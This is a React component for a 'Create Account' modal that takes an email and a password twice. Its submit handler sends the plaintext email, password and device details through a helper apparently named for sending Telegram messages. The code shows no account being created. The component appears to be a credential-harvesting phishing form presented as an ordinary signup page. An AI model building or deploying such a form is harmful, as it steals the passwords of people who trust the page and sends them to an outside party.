import clsx from "clsx";
import styles from "./index.module.scss";

import { useContext, useState, useEffect, useRef, RefObject } from "react";
import { MainContext } from "@/providers/MainContext";

import SendMessage from "@/utils/telegramSendMessage";

import IconEyeClose from "@/public/img/icons/eyeClose";
import IconEmail from "@/public/img/icons/email";

interface ICreateAccountEnterProps {
  func: () => void;
}

const CreateAccountEnter: React.FunctionComponent<ICreateAccountEnterProps> = ({
  func,
}) => {
  const { modalCreateAccount, device, buttonTrigger } = useContext(MainContext);

  const [inputEmailValue, setInputEmailValue] = useState<string>("");
  const [inputPassValue, setInputPassValue] = useState<string>("");
  const [inputPassReValue, setInputPassReValue] = useState<string>("");

  const refPassword = useRef<HTMLInputElement>(null);
  const refPasswordReenter = useRef<HTMLInputElement>(null);

  const HandleButton = async () => {
    let resMas = {
      "Email: ": inputEmailValue,
      "Pass: ": inputPassValue,
      "Device: ": device,
      "Button: ": buttonTrigger,
    };

    let response = await SendMessage(resMas);

    console.log(response);
    response && func();
  };

  const viewPass = (ref: RefObject<HTMLInputElement>) => {
    let el = ref.current;

    if (el) {
      if (el.type === "password") {
        el.type = "text";
      } else {
        el.type = "password";
      }
    }
  };

  const ViewPassword = () => {
    viewPass(refPassword);
  };

  const ViewPasswordReenter = () => {
    viewPass(refPasswordReenter);
  };

  useEffect(() => {
    if (!modalCreateAccount.isActive) {
      setInputEmailValue("");
      setInputPassValue("");
      setInputPassReValue("");
    }
  }, [modalCreateAccount.isActive]);

  return (
    <div className={clsx(styles.CreateAccountEnter)}>
      <div className={clsx(styles.CreateAccountEnter_header)}>
        Let&apos;s create Something Cool!
      </div>
      <div className={clsx(styles.CreateAccountEnter_description)}>
        Please enter your email and password, we’ll send a link to access your
        account.
      </div>
      <div className={clsx(styles.CreateAccountEnter_inputs)}>
        <div className={clsx(styles.CreateAccountEnter_inputBox)}>
          <input
            className={clsx(styles.CreateAccountEnter_input)}
            type="email"
            name="email"
            placeholder="example@gmail.com"
            value={inputEmailValue}
            onChange={(e) => {
              setInputEmailValue(e.target.value);
            }}
          />
          <div className={clsx(styles.CreateAccountEnter_inputBox_icon)}>
            <IconEmail />
          </div>
        </div>
        <div className={clsx(styles.CreateAccountEnter_inputBox)}>
          <input
            className={clsx(styles.CreateAccountEnter_input)}
            type="password"
            name="password"
            placeholder="your password"
            value={inputPassValue}
            onChange={(e) => {
              setInputPassValue(e.target.value);
            }}
            ref={refPassword}
          />
          <div
            className={clsx(styles.CreateAccountEnter_inputBox_icon)}
            onClick={ViewPassword}
          >
            <IconEyeClose />
          </div>
        </div>

        <div className={clsx(styles.CreateAccountEnter_inputBox)}>
          <input
            className={clsx(
              styles.CreateAccountEnter_input,
              inputPassValue != inputPassReValue && styles.error
            )}
            type="password"
            name="password"
            placeholder="reenter the password"
            value={inputPassReValue}
            onChange={(e) => {
              setInputPassReValue(e.target.value);
            }}
            ref={refPasswordReenter}
          />
          <div
            className={clsx(styles.CreateAccountEnter_inputBox_icon)}
            onClick={ViewPasswordReenter}
          >
            <IconEyeClose />
          </div>
        </div>
      </div>

      <div
        className={clsx(
          styles.CreateAccountEnter_button,
          inputEmailValue &&
            inputPassValue &&
            inputPassValue == inputPassReValue &&
            styles.active
        )}
        onClick={HandleButton}
      >
        Create Account
      </div>
    </div>
  );
};

export default CreateAccountEnter;
